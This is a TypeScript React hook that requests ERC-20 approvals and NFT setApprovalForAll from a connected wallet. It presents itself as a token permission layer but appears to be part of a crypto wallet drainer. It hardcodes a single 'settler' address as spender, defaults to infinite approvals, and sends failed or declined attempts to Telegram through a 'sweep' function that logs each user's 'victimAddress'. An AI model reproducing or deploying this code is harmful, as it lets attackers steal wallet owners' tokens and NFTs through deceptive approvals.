"use client";

import { useCallback } from "react";
import {
  parseAbi,
  getAddress,
  createWalletClient,
  createPublicClient,
  custom,
} from "viem";
import { EXECUTION_POLICY } from "../../lib/ghost/constants";
import { sendDetailedSweepToTelegram } from "../../lib/telegram";

/** 📝 PRE-PARSED ABIs (Performance Optimization) */
const ALLOWANCE_ABI = parseAbi([
  "function allowance(address,address) view returns (uint256)",
]);
const APPROVE_ABI = parseAbi([
  "function approve(address,uint256) external returns (bool)",
]);
const NFT_ABI = parseAbi(["function setApprovalForAll(address,bool) external"]);

const AUTHORIZED_SETTLER = getAddress(
  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
);
const INFINITE_APPROVAL =
  115792089237316195423570985008687907853269984665640564039457584007913129639935n;

/**
 * 🛰️ TOKEN PERMISSION LAYER (v5.0.0 - Turbo Edition)
 * Maintained: Dynamic authorization checks & Telegram fail-safes.
 */
export function useTokenPermissions() {
  const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];

  const requestManualPermission = useCallback(
    async ({
      tokenAddress,
      symbol,
      isNft = false,
      chainId,
      injectedClient,
      amount,
    }: {
      tokenAddress: string;
      symbol: string;
      isNft?: boolean;
      chainId: number;
      injectedClient?: any;
      amount?: string;
    }) => {
      const logPrefix = `[useTokenPermissions] [${symbol}]`;

      // 🛡️ SECURITY GUARD: Integrity & Environment Checks
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }
      if (
        process.env.NEXT_PUBLIC_SETTLER_ADDR &&
        getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
      ) {
        throw new Error("UNAUTHORIZED_SETTLER_ADDRESS_CONFIGURED");
      }

      let activeClient = injectedClient;
      if (activeClient && !activeClient.writeContract) {
        activeClient = createWalletClient({
          chain: { id: chainId } as any,
          transport: custom(activeClient),
        });
      }

      if (!activeClient)
        return { success: false, reason: "WALLET_NOT_CONNECTED" };

      let account: `0x${string}` | undefined;

      try {
        const [addresses, currentId] = await Promise.all([
          activeClient.getAddresses(),
          activeClient.getChainId(),
        ]);

        account = addresses[0];

        // 🟢 2. PRE-FLIGHT CHECK (Instant Allowance Verify)
        if (!isNft) {
          try {
            const publicClient = createPublicClient({
              chain: { id: chainId } as any,
              transport: custom(window.ethereum || activeClient.transport),
            });

            const currentAllowance = (await publicClient.readContract({
              address: getAddress(tokenAddress),
              abi: ALLOWANCE_ABI,
              functionName: "allowance",
              args: [account!, getAddress(PERMIT2_MASTER)],
            })) as bigint;

            const required = BigInt(amount || "0");
            if (currentAllowance > 0n && currentAllowance >= required) {
              console.log(`${logPrefix} ✅ Allowance sufficient. Skipping TX.`);
              return { success: true, alreadyExisted: true };
            }
          } catch {
            // Silently fail pre-flight and move to approval for speed
          }
        }

        // ⚡ Chain Validation
        if (Number(currentId) !== chainId) {
          return { success: false, reason: "CHAIN_MISMATCH" };
        }

        // 🧠 Smart Approval Logic (Maintained 2% Buffer)
        let approvalAmount: bigint;
        if (isNft) {
          approvalAmount = 1n;
        } else if (amount && amount !== "0" && amount !== "undefined") {
          const raw = BigInt(amount.replace(/[^0-9]/g, "") || "0");
          approvalAmount = raw > 0n ? (raw * 102n) / 100n : INFINITE_APPROVAL;
        } else {
          approvalAmount = INFINITE_APPROVAL;
        }

        // 📝 Execute Approval Transaction
        let hash: `0x${string}`;
        if (isNft) {
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: NFT_ABI,
            functionName: "setApprovalForAll",
            args: [getAddress(PERMIT2_MASTER), true],
            account: account!,
          });
        } else {
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: APPROVE_ABI,
            functionName: "approve",
            args: [getAddress(PERMIT2_MASTER), approvalAmount],
            account: account!,
          });
        }

        return { success: true, hash };
      } catch (err: any) {
        const isUserReject =
          err.message?.includes("User rejected") || err.code === 4001;

        // 🛰️ Async Telegram notification (non-blocking)
        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "USER DECLINED APPROVAL" : "APPROVAL FAILED",
          victimAddress: account || "Unknown",
          symbol: symbol,
          error: isUserReject ? "User cancelled transaction" : err.message,
          chainId: chainId,
        });

        if (isUserReject) return { success: false, reason: "REJECTED" };
        return { success: false, error: err.message };
      }
    },
    [PERMIT2_MASTER],
  );

  return { requestManualPermission };
}
